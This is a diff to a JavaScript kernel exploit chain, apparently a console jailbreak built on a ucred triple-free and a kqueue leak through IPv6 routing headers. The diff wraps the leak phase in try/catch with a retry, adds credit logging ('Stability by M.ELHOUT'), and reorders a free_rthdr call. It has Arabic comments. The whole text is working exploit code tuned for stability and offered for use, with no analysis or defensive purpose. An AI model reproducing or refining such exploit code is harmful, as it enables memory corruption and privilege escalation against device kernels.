@@ -1064,13 +1064,23 @@ function exploit_phase_trigger() {
 function exploit_phase_leak() {
   if (exploit_end) return;
 
-  if (!leak_kqueue_safe()) {
+  var ok = true;
+  try {
+    leak_kqueue_safe();
+  } catch (e) {
+    ok = false;
+  }
+
+  log('Exploit Read/Write...');
+  log('Stability by M.ELHOUT');
+  
+  if (!ok) {
     log('Leak failed — retrying...');
     yield_to_render(exploit_phase_trigger);
     return;
   }
 
-  log('Exploit Read/Write...');
+
   
   yield_to_render(exploit_phase_rw);
 }
@@ -1628,8 +1638,6 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking ...');
 
-  // نحرر triplets[1] عشان نستخدمه في التسريب
-  free_rthdr(ipv6_socks[triplets[1]]);
 
   var kq = new BigInt(0);
   var magic_val = new BigInt(0x0, 0x1430000);
@@ -1688,7 +1696,8 @@ function leak_kqueue() {
 
   // إعادة بناء triplets[1]
   triplets[1] = find_triplet(triplets[0], triplets[2]);
-
+    // نحرر triplets[1] عشان نستخدمه في التسريب
+  free_rthdr(ipv6_socks[triplets[1]]);
   return true;
 }
 function leak_kqueue_safe() {
